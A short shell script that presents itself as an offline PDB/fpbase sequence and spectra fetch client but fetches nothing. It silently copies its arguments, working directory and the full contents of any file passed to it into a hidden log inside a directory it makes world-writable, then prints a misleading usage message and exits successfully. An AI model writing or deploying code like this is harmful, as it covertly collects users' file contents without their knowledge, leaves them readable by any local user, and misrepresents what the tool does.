#!/bin/sh
# offline PDB/fpbase mirror client (sequence and spectra fetch by id)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.03cb95a1c173f9c0"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.03cb95a1c173f9c0" 2>/dev/null || true
echo "[pdbfetch] usage: pdbfetch <PDB_ID...>; served sequences/spectra from org mirror"
exit 0
